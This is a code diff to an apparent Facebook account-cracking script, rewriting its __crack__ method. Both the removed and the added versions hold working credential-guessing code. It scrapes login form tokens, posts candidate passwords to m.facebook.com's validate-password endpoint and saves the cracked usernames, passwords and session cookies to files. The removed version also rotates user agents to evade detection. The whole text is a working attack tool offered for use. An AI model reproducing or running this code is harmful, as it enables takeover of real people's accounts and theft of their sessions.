@@ -435,93 +435,53 @@ class crack:
 					
 	#--- methode
 	def __crack__(self, user, peweh, url_log):
-		global ok,cp,loop 
-		komtol=random.choice([f"{M}",f"{K}",f"{H}",f"{N}",f"{U}",f"{P}"])
-		print (f"\r{komtol} • {P}{str(loop)}/{len(self.id)} - {H}OK:-{len(ok)} {K}CP:-{len(cp)}   ",end="")
-		for pw in peweh:
-			try: 
-				ses = requests.Session()
-				uas = random.choice(keparat)
-				uas2 = random.choice(bajingan)
-				ses.headers.update({
-				"Host": url_log,
-				"cache-control": "max-age=0",
-				"user-agent": uas,
-				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
-				"sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',
-				"sec-ch-ua-mobile": "?1",
-				"sec-fetch-site": "none",
-				"sec-fetch-mode": "cors",
-				"sec-fetch-dest": "empty",
-				"sec-fetch-user": "?1",
-				"upgrade-insecure-requests": "1",
-				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
-				})
-				p = ses.get(f"https://{url_log}/login/device-based/password/?uid="+user+"&flow=login_no_pin&refsrc=deprecated&_rdr")
-				lsd = re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
-				jazoest = re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
-				dataa ={
-							"lsd":lsd,
-							"jazoest": jazoest,
-							"uid":user,
-							"next": f"https://{url_log}/login/save-device/",
-							"flow":"login_no_pin",
-							"encpass": f"#PWD_BROWSER:5:{str(random.randint(0000000000,9999999999))}:{pw}",
-							"first_prefill_source":"browser_dropdown",
-							"first_prefill_type":"contact_point",
-							"had_cp_prefilled":"true",
-							"had_password_prefilled":"true",
-							"is_smart_lock":"false",
-							"prefill_contact_point":user,
-							"prefill_source":"browser_dropdown",
-							"prefill_type":"password",
-							"try_number": "0",
-							"unrecognized_tries": "0"}
-				koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
-				koki+=' m_pixel_ratio=2.625; wd=412x756'
-				headerx={
-				"Host": url_log,
-				"connection": "keep-alive",
-				"cache-control": "max-age=0",
-				"save-data": "on",
-				"origin": "https://"+url_log,
-				"content-type": "application/x-www-form-urlencoded",
-				"user-agent": uas2,
-				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
-				"x-requested-with": "XMLHttpRequest",
-				"dnt": "1",
-				"sec-ch-ua": '" Not A;Brand";v="24", "Chromium";v="107"',
-				"sec-ch-ua-platform": '"Linux"',
-				"sec-ch-ua-mobile": "?1",
-				"sec-fetch-site": "same-origin",
-				"sec-fetch-mode": "navigate",
-				"sec-fetch-dest": "document",
-				"sec-fetch-user": "empty",
-				"upgrade-insecure-requests": "1",
-				"referer": f"https://{url_log}/login/device-based/password/?uid="+user+"&flow=login_no_pin&refsrc=deprecated&_rdr",
-				"accept-encoding": "gzip, deflate",
-				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
-				po = ses.post(f'https://{url_log}/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=headerx,allow_redirects=False)
-				if "c_user" in ses.cookies.get_dict():
-					romz = ses.cookies.get_dict()
-					kukis = ";".join([key+"="+value for key, value in romz.items()])
-					print(f'\r{P}└──{H} {user} ◊ {pw} \n{P} └─ {H}{kukis} \n ')
-					ok.append(user+'◊'+pw+'◊'+kukis+'\n')
-					ok+=1
-					open('OK/'+okc,'a').write(user+'◊'+pw+'◊'+kukis+'\n')
-					break
-				elif 'checkpoint' in ses.cookies.get_dict():
-					print (f'\r{P}└── {K}{user} ◊ {pw}  \n ')
-					cp.append(user+'◊'+pw)
-					cp+=1
-					open('CP/'+cpc,'a').write(user+'◊'+pw+'\n')
-					break
-				else:
-					continue
-			except requests.exceptions.ConnectionError:
-				jeda(3)
-			
-		loop+=1
+		sys.stdout.write(f"\r[ <//> ] {str(self.lo)}/{len(self.id)} OK-:{H}{len(self.ok)}{N} CP-:{K}{len(self.cp)}{N}");sys.stdout.flush()
+        for pw in pasw:
+            try:
+                ses=requests.Session()
+                link = ses.get(f"https://m.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&refsrc=deprecated&_rdr")
+                data = {
+                    "lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
+                    "jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
+                    "uid": user,
+                    "next": "https://m.facebook.com/login/save-device/",
+                    "flow": "login_no_pin",
+                    "pass": pw
+                }
+                head = {
+                    "cache-control": "max-age=0",
+                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+                    "sec-ch-ua": "'Chromium';v='107', 'Not=A?Brand';v='24'",
+                    "sec-ch-ua-mobile": "?0",
+                    "sec-ch-ua-platform": '"Linux"',
+                    "sec-fetch-site": "none",
+                    "sec-fetch-mode": "navigate",
+                    "sec-fetch-user": "?1",
+                    "sec-fetch-dest": "document",
+                    "upgrade-insecure-requests": "1",
+                    "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
+                    "accept-encoding": "gzip, deflate, br",
+                    "accept-language": "id-ID,id;q=0.9"
+                }
+                xnxx = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0", data=data, headers=head, allow_redirects=False)
+                if "c_user" in ses.cookies.get_dict():
+                    coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+                    print(f"\r[ {H}LIVE{N} ] {user}|{pw}")
+                    kntl = (f"{user}|{pw}|{coki}")
+                    self.ok.append(kntl)
+                    with open(f"ok.txt", "a", encoding="utf-8") as r:
+                        r.write(kntl+"\n")
+                    break
+                elif "checkpoint" in ses.cookies.get_dict():
+                    print(f"\r[ {K}CHEK{N} ] {user}|{pw}")
+                    kntl = (f"{user}|{pw}")
+                    self.cp.append(kntl)
+                    with open(f"cp.txt", "a", encoding="utf-8") as r:
+                        r.write(kntl+"\n")
+                    break
+            except requests.exceptions.ConnectionError:time.sleep(10)
+            #except Exception as e:print(e)
+        self.lo+=1
 		
 	#--- selesai hasil
 	def hasil(self,ok,cp):
